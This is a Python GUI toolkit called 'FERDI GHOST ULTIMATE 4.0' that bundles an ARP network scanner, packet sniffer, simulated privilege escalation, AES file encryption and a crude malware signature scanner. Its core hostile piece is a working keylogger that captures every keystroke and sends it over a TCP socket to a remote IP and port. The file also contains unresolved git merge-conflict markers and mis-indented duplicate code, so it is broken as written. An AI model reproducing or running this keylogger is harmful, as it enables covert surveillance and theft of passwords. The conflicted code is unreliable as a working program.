python
import os
import sys
import time
import socket
import threading
import subprocess
from pynput import keyboard
import scapy.all as scapy
<<<<<<< HEAD
from PyQt5.QtWidgets import (
QApplication, QWidget, QPushButton, QVBoxLayout,
QLabel, QTextEdit, QHBoxLayout, QFileDialog,
QMessageBox, QLineEdit, QGroupBox
)
from PyQt5.QtGui import QFont, QTextCursor
from PyQt5.QtCore import Qt, QTimer
=======
from PyQt5.QtWidgets import (QApplication, QWidget, QPushButton, QVBoxLayout,
                             QLabel, QTextEdit, QHBoxLayout, QFileDialog,
                             QMessageBox, QLineEdit, QGroupBox)
from PyQt5.QtGui import QFont
from PyQt5.QtCore import Qt
>>>>>>> 1376a6b1e19dff2600ef99e8a37059bfebb3d204
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import requests

#ASCII Banner
BANNER_ASCII = r"""
███████╗███████╗██████╗ ███████╗██╗ ██████╗ ███████╗
██╔════╝██╔════╝██╔══██╗██╔════╝██║██╔═══██╗██╔════╝
█████╗  █████╗  ██████╔╝█████╗  ██║██║   ██║███████╗
██╔══╝  ██╔══╝  ██╔═══╝ ██╔══╝  ██║██║   ██║╚════██║
██║     ███████╗██║     ███████╗██║╚██████╔╝███████║
╚═╝     ╚══════╝╚═╝     ╚══════╝╚═╝ ╚═════╝ ╚══════╝
"""

#Malware Signatures
SIGNATURES = {
    "RAT": [b"socket.connect", b"reverse_shell"],
    "BACKDOOR": [b"/dev/tcp/", b"nohup"],
    "VIRUS": [b"mov eax", b"jmp", b"xor"],
    "KEYLOGGER": [b"keylogger", b"keyboard_hook"],
    "CRYPTOMINER": [b"cryptonight", b"xmr-stak"]
}

class FerdiGhost(QWidget):
    def __init__(self):
        super().__init__()
<<<<<<< HEAD
self.setWindowTitle("FERDI GHOST ULTIMATE 4.0")
self.setFixedSize(1200, 800)
self.setStyleSheet("background-color: black; color: #00ff66;")
self.setFont(QFont("Courier New", 10))
# Advanced attributes
self.target_ip = "192.168.1.1"
self.target_port = 4444
self.socket = None
self.listener = None
self.is_keylogging = False
self.is_sniffing = False
self.packet_count = 0
self.init_ui()


def init_ui(self):
    layout = QVBoxLayout()
=======
        self.setWindowTitle("FERDI GHOST ULTIMATE 4.0")
        self.setFixedSize(1200, 800)
        self.setStyleSheet("background-color: black; color: #00ff66;")
        self.setFont(QFont("Courier New", 10))
        
        # Advanced attributes
        self.target_ip = "192.168.1.1"
        self.target_port = 4444
        self.socket = None
        self.listener = None
        self.is_keylogging = False
        self.is_sniffing = False
        self.packet_count = 0
        
        self.init_ui()
>>>>>>> 1376a6b1e19dff2600ef99e8a37059bfebb3d204

    def init_ui(self):
        layout = QVBoxLayout()

        # Banner
        self.banner = QLabel(BANNER_ASCII)
        self.banner.setAlignment(Qt.AlignCenter)
        self.banner.setStyleSheet("color: #00ff66;")
        layout.addWidget(self.banner)

        # Target configuration
        config_group = QGroupBox("Target Configuration")
        config_layout = QHBoxLayout()
        self.ip_input = QLineEdit(self.target_ip)
        self.port_input = QLineEdit(str(self.target_port))
        config_layout.addWidget(QLabel("Target IP:"))
        config_layout.addWidget(self.ip_input)
        config_layout.addWidget(QLabel("Port:"))
        config_layout.addWidget(self.port_input)
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)

<<<<<<< HEAD
    # Buttons
    btn_layout = QHBoxLayout()
    
    # Scanning
    self.scan_file_btn = self.create_button("Scan File", self.scan_file_action)
    self.scan_folder_btn = self.create_button("Scan Folder", self.scan_folder_action)
    self.network_scan_btn = self.create_button("Network Scan", self.network_scan)
    
    # Exploitation
    self.keylogger_btn = self.create_button("Start Keylogger", self.toggle_keylogger)
    self.sniffer_btn = self.create_button("Start Sniffer", self.toggle_sniffer)
    self.exploit_btn = self.create_button("Run Exploit", self.run_exploit)
    
    # Crypto
    self.encrypt_btn = self.create_button("Encrypt File", self.encrypt_file_action)
    self.decrypt_btn = self.create_button("Decrypt File", self.decrypt_file_action)
    
    # Add buttons to layout
    for btn in [
        self.scan_file_btn, self.scan_folder_btn, self.network_scan_btn,
        self.keylogger_btn, self.sniffer_btn, self.exploit_btn,
        self.encrypt_btn, self.decrypt_btn
    ]:
        btn_layout.addWidget(btn)
        
    layout.addLayout(btn_layout)
    self.setLayout(layout)

def create_button(self, text, callback):
    btn = QPushButton(text)
    btn.setStyleSheet("background-color: #111; color: #00ff66; padding: 8px;")
    btn.clicked.connect(callback)
    return btn

# --------------------------
# Advanced Features
# --------------------------

def network_scan(self):
    """Perform network scan using ARP"""
    self.output.append("[+] Starting network scan...")
    try:
        ans, unans = scapy.arping(self.target_ip + "/24")
        for sent, received in ans:
            self.output.append(f"[+] Host Alive: {received.psrc} - {received.hwsrc}")
    except Exception as e:
        self.output.append(f"[-] Scan failed: {str(e)}")

def toggle_sniffer(self):
    """Toggle packet sniffer"""
    if self.is_sniffing:
        self.is_sniffing = False
        self.sniffer_btn.setText("Start Sniffer")
        self.output.append("[+] Sniffer stopped")
    else:
        self.is_sniffing = True
        self.sniffer_btn.setText("Stop Sniffer")
        self.output.append("[+] Sniffer started (100 packets max)")
        threading.Thread(target=self.packet_sniffer, daemon=True).start()

def packet_sniffer(self):
    """Sniff network traffic"""
    def packet_callback(packet):
        if self.packet_count >= 100:
            return
        if packet.haslayer(scapy.IP):
            self.packet_count += 1
            self.output.append(f"[Packet {self.packet_count}] {packet.summary()}")
            
    scapy.sniff(prn=packet_callback, store=0, stop_filter=lambda x: not self.is_sniffing)

def run_exploit(self):
    """Simulate exploit execution"""
    self.output.append("[+] Running simulated exploit...")
    try:
        # Simulate command execution
        result = subprocess.check_output("whoami", shell=True)
        self.output.append(f"[+] Current user: {result.decode().strip()}")
=======
        # Output console
        self.output = QTextEdit()
        self.output.setReadOnly(True)
        self.output.setStyleSheet("background-color: black; border: 1px solid #00ff66;")
        layout.addWidget(self.output)

        # Buttons
        btn_layout = QHBoxLayout()
        self.scan_file_btn = self.create_button("Scan File", self.scan_file_action)
        self.scan_folder_btn = self.create_button("Scan Folder", self.scan_folder_action)
        self.network_scan_btn = self.create_button("Network Scan", self.network_scan)
        self.keylogger_btn = self.create_button("Start Keylogger", self.toggle_keylogger)
        self.sniffer_btn = self.create_button("Start Sniffer", self.toggle_sniffer)
        self.exploit_btn = self.create_button("Run Exploit", self.run_exploit)
        self.encrypt_btn = self.create_button("Encrypt File", self.encrypt_file_action)
        self.decrypt_btn = self.create_button("Decrypt File", self.decrypt_file_action)
        
        for btn in [self.scan_file_btn, self.scan_folder_btn, self.network_scan_btn,
                    self.keylogger_btn, self.sniffer_btn, self.exploit_btn,
                    self.encrypt_btn, self.decrypt_btn]:
            btn_layout.addWidget(btn)
>>>>>>> 1376a6b1e19dff2600ef99e8a37059bfebb3d204
        
        layout.addLayout(btn_layout)
        self.setLayout(layout)

    def create_button(self, text, callback):
        btn = QPushButton(text)
        btn.setStyleSheet("background-color: #111; color: #00ff66; padding: 8px;")
        btn.clicked.connect(callback)
        return btn

    # --------------------------
    # Advanced Features
    # --------------------------
    def network_scan(self):
        self.output.append("[+] Starting network scan...")
        try:
            ans, unans = scapy.arping(self.target_ip + "/24")
            for sent, received in ans:
                self.output.append(f"[+] Host Alive: {received.psrc} - {received.hwsrc}")
        except Exception as e:
            self.output.append(f"[-] Scan failed: {str(e)}")

    def toggle_sniffer(self):
        if self.is_sniffing:
            self.is_sniffing = False
            self.sniffer_btn.setText("Start Sniffer")
            self.output.append("[+] Sniffer stopped")
        else:
            self.is_sniffing = True
            self.sniffer_btn.setText("Stop Sniffer")
            self.output.append("[+] Sniffer started (100 packets max)")
            threading.Thread(target=self.packet_sniffer, daemon=True).start()

    def packet_sniffer(self):
        def packet_callback(packet):
            if self.packet_count >= 100:
                return
            if packet.haslayer(scapy.IP):
                self.packet_count += 1
                self.output.append(f"[Packet {self.packet_count}] {packet.summary()}")
        scapy.sniff(prn=packet_callback, store=0, stop_filter=lambda x: not self.is_sniffing)

    def run_exploit(self):
        self.output.append("[+] Running simulated exploit...")
        try:
            result = subprocess.check_output("whoami", shell=True)
            self.output.append(f"[+] Current user: {result.decode().strip()}")
            self.output.append("[+] Attempting privilege escalation...")
            time.sleep(1)
            self.output.append("[+] Got root! (simulated)")
        except Exception as e:
            self.output.append(f"[-] Exploit failed: {str(e)}")

    # --------------------------
    # Keylogger
    # --------------------------
    def toggle_keylogger(self):
        if self.is_keylogging:
            self.stop_keylogger()
            self.keylogger_btn.setText("Start Keylogger")
        else:
            self.start_keylogger()
            self.keylogger_btn.setText("Stop Keylogger")

    def start_keylogger(self):
        self.target_ip = self.ip_input.text()
        self.target_port = int(self.port_input.text())
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.target_ip, self.target_port))
            def on_press(key):
                try:
                    char = key.char
                except AttributeError:
                    char = f"[{key}]"
                try:
                    self.socket.sendall(char.encode())
                except Exception as e:
                    self.output.append(f"[-] Keylogger error: {str(e)}")
                    return False
            self.listener = keyboard.Listener(on_press=on_press)
            self.is_keylogging = True
            self.listener.start()
            self.output.append(f"[+] Keylogger active -> {self.target_ip}:{self.target_port}")
        except Exception as e:
            self.output.append(f"[-] Keylogger failed: {str(e)}")
            self.is_keylogging = False

    def stop_keylogger(self):
        if self.listener:
            self.listener.stop()
        if self.socket:
            self.socket.close()
        self.is_keylogging = False
        self.output.append("[+] Keylogger stopped")

    # --------------------------
    # Crypto
    # --------------------------
    def encrypt_file_action(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File to Encrypt")
        if path:
            try:
                key = get_random_bytes(32)
                cipher = AES.new(key, AES.MODE_GCM)
                with open(path, "rb") as f:
                    plaintext = f.read()
                ciphertext, tag = cipher.encrypt_and_digest(plaintext)
                with open(path + ".ghost", "wb") as f:
                    [f.write(x) for x in (cipher.nonce, tag, ciphertext)]
                with open(path + ".key", "wb") as f:
                    f.write(key)
                self.output.append(f"[+] File encrypted: {path}.ghost")
                self.output.append(f"[!] KEY SAVED TO: {path}.key - KEEP THIS SAFE!")
            except Exception as e:
                self.output.append(f"[-] Encryption failed: {str(e)}")

    def decrypt_file_action(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File to Decrypt")
        if path and path.endswith(".ghost"):
            key_path = path[:-6] + ".key"
            try:
                with open(key_path, "rb") as f:
                    key = f.read()
                with open(path, "rb") as f:
                    nonce, tag, ciphertext = [f.read(x) for x in (16, 16, -1)]
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                output_path = path[:-6] + ".decrypted"
                with open(output_path, "wb") as f:
                    f.write(plaintext)
                self.output.append(f"[+] File decrypted: {output_path}")
            except Exception as e:
                self.output.append(f"[-] Decryption failed: {str(e)}")

    # --------------------------
    # Scanning
    # --------------------------
    def scan_file(self, path):
        try:
            with open(path, "rb") as f:
                data = f.read()
                results = []
                for family, sigs in SIGNATURES.items():
                    for sig in sigs:
                        if sig in data:
                            results.append(family)
                if results:
                    return f"[!] MALICIOUS ({'|'.join(results)}) {path}"
                else:
                    if data[:2] == b'MZ':
                        return f"[?] POTENTIAL (Executable) {path}"
                    return f"[+] CLEAN {path}"
        except Exception as e:
            return f"[-] ERROR {path}: {str(e)}"

    def scan_file_action(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select File")
        if path:
            result = self.scan_file(path)
            self.output.append(result)

    def scan_folder_action(self):
        path = QFileDialog.getExistingDirectory(self, "Select Folder")
        if path:
            self.output.append(f"[+] Scanning folder: {path}")
            file_count = 0
            infected_count = 0
            for root, _, files in os.walk(path):
                for name in files:
                    fpath = os.path.join(root, name)
                    result = self.scan_file(fpath)
                    if "MALICIOUS" in result:
                        infected_count += 1
                        self.output.append(result)
                    file_count += 1
                    if file_count % 10 == 0:
                        QApplication.processEvents()
            self.output.append(f"[+] Scan complete: {file_count} files, {infected_count} threats")

# --------------------------
# Run App
# --------------------------
def run_app():
    os.environ["XDG_RUNTIME_DIR"] = "/tmp/runtime-root"
    app = QApplication(sys.argv)
    window = FerdiGhost()
    window.show()
    sys.exit(app.exec_())

<<<<<<< HEAD

if __name__ == "__main__":
    run_app()


=======
if __name__ == "__main__":
    run_app()
>>>>>>> 1376a6b1e19dff2600ef99e8a37059bfebb3d204
